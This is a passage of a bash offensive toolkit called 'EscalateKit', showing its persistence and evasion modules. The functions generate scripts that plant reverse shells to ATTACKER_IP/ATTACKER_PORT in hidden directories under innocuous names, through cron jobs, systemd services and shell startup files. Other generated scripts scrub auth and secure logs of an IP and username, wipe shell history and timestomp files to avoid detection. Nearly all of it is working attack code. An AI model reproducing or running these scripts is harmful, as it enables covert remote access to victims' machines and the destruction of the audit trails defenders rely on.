    echo "# Add cron job to run every 30 minutes" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "(crontab -l 2>/dev/null; echo \"*/30 * * * * $persist_script\") | crontab -" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "echo \"[+] Cron job persistence added to run every 30 minutes\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "echo \"[+] Persistence script located at: $persist_script\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"

    chmod +x "$OUTPUT_DIR/persist/add_cron_job.sh"

    echo "[+] Cron job persistence setup:" >>"$output_file"
    echo "    - Script location: $persist_script" >>"$output_file"
    echo "    - Schedule: Every 30 minutes" >>"$output_file"
    echo "    - Setup script: $OUTPUT_DIR/persist/add_cron_job.sh" >>"$output_file"
    echo "    - Replace ATTACKER_IP and ATTACKER_PORT in the script" >>"$output_file"

    log_message "INFOS" "Cron job persistence setup complete"
    return 0
}

persist_systemd_service() {
    log_message "INFOS" "Setting up systemd service persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/systemd_service.txt"

    echo "--- Systemd Service Persistence ---" >"$output_file"

    # Check if systemd is present
    if ! command -v systemctl >/dev/null 2>&1; then
        echo "[-] systemctl command not found, systemd might not be in use" >>"$output_file"
        log_message "ERROR" "systemctl command not found, systemd might not be in use"
        return 1
    fi

    # Create a hidden directory for the persistence script
    hidden_dir="$HOME/.config/.system"
    mkdir -p "$hidden_dir" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create hidden directory: $hidden_dir" >>"$output_file"
        log_message "ERROR" "Could not create hidden directory: $hidden_dir"
        return 1
    fi

    # Create the persistence script
    persist_script="$hidden_dir/system_helper.sh"
    echo "#!/bin/bash" >"$persist_script"
    echo "# System helper script" >>"$persist_script"
    echo "# Reverse shell payload - replace ATTACKER_IP and ATTACKER_PORT" >>"$persist_script"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'" >>"$persist_script"
    chmod +x "$persist_script"

    # Service name and paths
    service_name="system-helper"
    user_service_dir="$HOME/.config/systemd/user"
    system_service_dir="/etc/systemd/system"

    # Create a script to set up the systemd service
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Systemd Service Persistence Script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Create hidden directory and persistence script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "mkdir -p \"$hidden_dir\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "cat > \"$persist_script\" << 'EOF'" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "#!/bin/bash" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# System helper script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Replace ATTACKER_IP and ATTACKER_PORT with your actual values" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "chmod +x \"$persist_script\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Attempt to create a user-level service first" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "mkdir -p \"$user_service_dir\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "cat > \"$user_service_dir/$service_name.service\" << EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Unit]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Description=System Helper Service" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Service]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Type=simple" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "ExecStart=$persist_script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Restart=always" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "RestartSec=60" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Install]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "WantedBy=default.target" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Enable and start the user service" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "systemctl --user daemon-reload 2>/dev/null" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "systemctl --user enable \"$service_name.service\" 2>/dev/null" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "systemctl --user start \"$service_name.service\" 2>/dev/null" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# If we have sudo rights, try to create a system-wide service as well" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "if command -v sudo >/dev/null 2>&1 && sudo -l | grep -q systemctl; then" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    echo \"[+] Attempting to create system-wide service (requires sudo)...\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo tee \"$system_service_dir/$service_name.service\" > /dev/null << EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Unit]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Description=System Helper Service" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "After=network.target" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Service]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Type=simple" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "ExecStart=$persist_script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Restart=always" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "RestartSec=60" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Install]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "WantedBy=multi-user.target" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo systemctl daemon-reload" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo systemctl enable \"$service_name.service\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo systemctl start \"$service_name.service\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "fi" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "echo \"[+] Systemd service persistence set up\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "echo \"[+] Service name: $service_name\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "echo \"[+] Persistence script: $persist_script\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"

    chmod +x "$OUTPUT_DIR/persist/add_systemd_service.sh"

    echo "[+] Systemd service persistence setup:" >>"$output_file"
    echo "    - Service name: $service_name" >>"$output_file"
    echo "    - Persistence script: $persist_script" >>"$output_file"
    echo "    - Setup script: $OUTPUT_DIR/persist/add_systemd_service.sh" >>"$output_file"
    echo "    - Replace ATTACKER_IP and ATTACKER_PORT in the script" >>"$output_file"

    log_message "INFOS" "Systemd service persistence setup complete"
    return 0
}

persist_startup_file() {
    log_message "INFOS" "Setting up startup file persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/startup_file.txt"

    echo "--- Startup File Persistence ---" >"$output_file"

    # Define potential startup file locations
    bash_rc="$HOME/.bashrc"
    bash_profile="$HOME/.bash_profile"
    profile="$HOME/.profile"
    zsh_rc="$HOME/.zshrc"

    # Check which shell configuration files exist and are writable
    echo "[*] Checking available shell configuration files..." >>"$output_file"

    writable_configs=""

    for config_file in "$bash_rc" "$bash_profile" "$profile" "$zsh_rc"; do
        if [ -w "$config_file" ]; then
            echo "[+] Found writable config file: $config_file" >>"$output_file"
            writable_configs="$writable_configs $config_file"
        elif [ -f "$config_file" ]; then
            echo "[-] Config file exists but is not writable: $config_file" >>"$output_file"
        fi
    done

    if [ -z "$writable_configs" ]; then
        echo "[-] No writable shell configuration files found" >>"$output_file"
        log_message "ERROR" "No writable shell configuration files found"
        return 1
    fi

    # Create a hidden persistence script
    hidden_dir="$HOME/.local/share/.cache"
    mkdir -p "$hidden_dir" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create hidden directory: $hidden_dir" >>"$output_file"
        log_message "ERROR" "Could not create hidden directory: $hidden_dir"
        return 1
    fi

    persist_script="$hidden_dir/update-cache.sh"

    # Create a script to set up the startup file persistence
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Startup File Persistence Script" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Create hidden directory and persistence script" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "mkdir -p \"$hidden_dir\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "cat > \"$persist_script\" << 'EOF'" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "#!/bin/bash" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Hidden persistence script" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Replace ATTACKER_IP and ATTACKER_PORT with your actual values" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &) 2>/dev/null" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# To avoid being too obvious, exit immediately if called interactively" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "if [[ \$- == *i* ]]; then true; fi" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "chmod +x \"$persist_script\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_startup_file.sh"

    # Add to configuration files with a stealthy approach
    echo "# Add to shell configuration files" >>"$OUTPUT_DIR/persist/add_startup_file.sh"

    for config_file in $writable_configs; do
        echo "echo \"\" >> \"$config_file\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
        echo "echo \"# Update system cache\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
        echo "echo \"[ -f \\\"$persist_script\\\" ] && . \\\"$persist_script\\\" &>/dev/null &\" >> \"$config_file\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
        echo "echo \"[+] Added persistence to: $config_file\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    done

    echo "" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "echo \"[+] Startup file persistence set up\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "echo \"[+] Persistence script: $persist_script\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "echo \"[+] Persistence will be triggered on next user login\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"

    chmod +x "$OUTPUT_DIR/persist/add_startup_file.sh"

    echo "[+] Startup file persistence setup:" >>"$output_file"
    echo "    - Writable configuration files: $writable_configs" >>"$output_file"
    echo "    - Persistence script: $persist_script" >>"$output_file"
    echo "    - Setup script: $OUTPUT_DIR/persist/add_startup_file.sh" >>"$output_file"
    echo "    - Replace ATTACKER_IP and ATTACKER_PORT in the script" >>"$output_file"

    log_message "INFOS" "Startup file persistence setup complete"
    return 0
}

# ----------------------------------------------------------------------
# Evasion Module
# ----------------------------------------------------------------------

evade_cleanup_logs() {
    log_message "INFOS" "Setting up log cleaning capabilities"

    mkdir -p "$OUTPUT_DIR/evade"
    local output_file="$OUTPUT_DIR/evade/cleanup_logs.txt"

    echo "--- Log Cleanup ---" >"$output_file"

    # Check common log files
    echo "[*] Checking for common log files..." >>"$output_file"

    log_files=""

    for log_file in "/var/log/auth.log" "/var/log/secure" "/var/log/syslog" "/var/log/messages" "/var/log/wtmp" "/var/log/btmp" "/var/log/lastlog" "$HOME/.bash_history"; do
        if [ -f "$log_file" ]; then
            echo "[+] Found log file: $log_file" >>"$output_file"
            log_files="$log_files $log_file"
        fi
    done

    if [ -z "$log_files" ]; then
        echo "[-] No common log files found" >>"$output_file"
    fi

    # Create a script to clean up logs
    echo "#!/bin/bash" >"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# Log Cleanup Script" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# This script helps remove traces from log files" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# Usage: ./clean_logs.sh [IP_ADDRESS] [USERNAME]" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# If no parameters are provided, it will use default values" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "IP_ADDRESS=\"\${1:-$(hostname -I | awk '{print $1}')\"}" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "USERNAME=\"\${2:-$(whoami)}\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "echo \"[*] Starting log cleanup for IP: \$IP_ADDRESS, User: \$USERNAME\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Add log cleaning commands for each log file
    echo "# Clean up common log files" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Auth log
    echo "if [ -f \"/var/log/auth.log\" ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[*] Cleaning /var/log/auth.log...\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    if [ \"\$(id -u)\" -eq 0 ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        # We have root, so we can directly modify the file" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        grep -v \"\$IP_ADDRESS\\|\$USERNAME\" \"/var/log/auth.log\" > \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        cat \"/tmp/.auth.tmp\" > \"/var/log/auth.log\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        rm -f \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[+] Cleaned /var/log/auth.log\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    else" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[-] Root privileges required to modify /var/log/auth.log\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Secure log (RHEL/CentOS)
    echo "if [ -f \"/var/log/secure\" ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[*] Cleaning /var/log/secure...\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    if [ \"\$(id -u)\" -eq 0 ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        grep -v \"\$IP_ADDRESS\\|\$USERNAME\" \"/var/log/secure\" > \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        cat \"/tmp/.secure.tmp\" > \"/var/log/secure\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        rm -f \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[+] Cleaned /var/log/secure\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    else" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[-] Root privileges required to modify /var/log/secure\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Bash history
    echo "# Clean bash history" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "if [ -f \"\$HOME/.bash_history\" ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[*] Cleaning bash history...\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    > \"\$HOME/.bash_history\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    history -c" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[+] Cleaned bash history\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Clean up temporary files
    echo "# Clean up any temporary files we've created" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "rm -f /tmp/.*.tmp 2>/dev/null" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "echo \"[+] Log cleanup complete\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    chmod +x "$OUTPUT_DIR/evade/clean_logs.sh"

    echo "[+] Log cleanup script created: $OUTPUT_DIR/evade/clean_logs.sh" >>"$output_file"
    echo "    - Usage: ./clean_logs.sh [IP_ADDRESS] [USERNAME]" >>"$output_file"
    echo "    - This script will remove traces of the specified IP and username from logs" >>"$output_file"
    echo "    - Root privileges are required for cleaning system logs" >>"$output_file"

    log_message "INFOS" "Log cleanup setup complete"
    return 0
}

evade_timestomp() {
    log_message "INFOS" "Setting up timestomping capabilities"

    mkdir -p "$OUTPUT_DIR/evade"
    local output_file="$OUTPUT_DIR/evade/timestomp.txt"

    echo "--- Timestomping ---" >"$output_file"

    # Create a script for timestomping
    echo "#!/bin/bash" >"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Timestomping Script" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# This script helps modify file timestamps to avoid detection" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Usage: ./timestomp.sh TARGET_FILE REFERENCE_FILE" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# If REFERENCE_FILE is not provided, it will use /etc/passwd" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "TARGET_FILE=\"\$1\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "REFERENCE_FILE=\"\${2:-/etc/passwd}\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "if [ -z \"\$TARGET_FILE\" ]; then" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Error: No target file specified\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Usage: \$0 TARGET_FILE [REFERENCE_FILE]\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    exit 1" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "if [ ! -f \"\$TARGET_FILE\" ]; then" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Error: Target file '\$TARGET_FILE' does not exist\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    exit 1" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "if [ ! -f \"\$REFERENCE_FILE\" ]; then" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Error: Reference file '\$REFERENCE_FILE' does not exist\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    exit 1" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"[*] Timestomping \$TARGET_FILE to match \$REFERENCE_FILE...\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Get reference file timestamps" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "REF_STAT=\$(stat -c \"Access: %x\\nModify: %y\\nChange: %z\" \"\$REFERENCE_FILE\")" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"Reference file timestamps:\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\$REF_STAT\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Get target file original timestamps" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "TARGET_STAT=\$(stat -c \"Access: %x\\nModify: %y\\nChange: %z\" \"\$TARGET_FILE\")" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\\nOriginal target file timestamps:\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\$TARGET_STAT\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Apply the timestamps from reference to target" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "touch -r \"\$REFERENCE_FILE\" \"\$TARGET_FILE\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Verify the new timestamps" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "NEW_TARGET_STAT=\$(stat -c \"Access: %x\\nModify: %y\\nChange: %z\" \"\$TARGET_FILE\")" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\\nNew target file timestamps:\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\$NEW_TARGET_STAT\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\\n[+] Timestomping complete\"" >>"$OUTPUT_DIR/evade/timestomp.sh"

    chmod +x "$OUTPUT_DIR/evade/timestomp.sh"

    echo "[+] Timestomping script created: $OUTPUT_DIR/evade/timestomp.sh" >>"$output_file"
    echo "    - Usage: ./timestomp.sh TARGET_FILE [REFERENCE_FILE]" >>"$output_file"
    echo "    - This script will modify file timestamps to match a reference file" >>"$output_file"
    echo "    - Default reference file is /etc/passwd" >>"$output_file"

    log_message "INFOS" "Timestomping setup complete"
    return 0
}

evade_cover_tracks() {
    log_message "INFOS" "Setting up track covering capabilities"

    mkdir -p "$OUTPUT_DIR/evade"
    local output_file="$OUTPUT_DIR/evade/cover_tracks.txt"

    echo "--- Cover Tracks ---" >"$output_file"

    # Create a script for covering tracks
    echo "#!/bin/bash" >"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# Cover Tracks Script" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# This script helps clean up traces after privilege escalation" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# Usage: ./cover_tracks.sh [DIRECTORY]" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# If DIRECTORY is not provided, it will clean up the current directory" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "TARGET_DIR=\"\${1:-.}\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Covering tracks in \$TARGET_DIR...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Clean command history
    echo "# Clean command history" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Cleaning command history...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "history -c" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "> ~/.bash_history" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "if [ -f ~/.zsh_history ]; then > ~/.zsh_history; fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "export HISTFILESIZE=0" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "export HISTSIZE=0" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "unset HISTFILE" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Remove temporary files
    echo "# Remove temporary files" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Removing temporary files...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "find \"\$TARGET_DIR\" -type f -name \"*.tmp\" -exec rm -f {} \\;" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "find \"\$TARGET_DIR\" -type f -name \"*.bak\" -exec rm -f {} \\;" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "find /tmp -type f -user \"\$(whoami)\" -exec rm -f {} \\; 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Clean logs
    echo "# Clean up log files (requires root for system logs)" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Cleaning log files...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "USER_IP=\$(hostname -I | awk '{print \$1}')" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "USER_NAME=\$(whoami)" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "if [ \"\$(id -u)\" -eq 0 ]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # We have root privileges, so we can clean system logs" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[+] Running with root privileges, cleaning system logs\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Auth log" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    if [ -f \"/var/log/auth.log\" ]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        grep -v \"\$USER_IP\\|\$USER_NAME\" \"/var/log/auth.log\" > \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        cat \"/tmp/.auth.tmp\" > \"/var/log/auth.log\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        rm -f \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Secure log (RHEL/CentOS)" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    if [ -f \"/var/log/secure\" ]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        grep -v \"\$USER_IP\\|\$USER_NAME\" \"/var/log/secure\" > \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        cat \"/tmp/.secure.tmp\" > \"/var/log/secure\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        rm -f \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "else" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
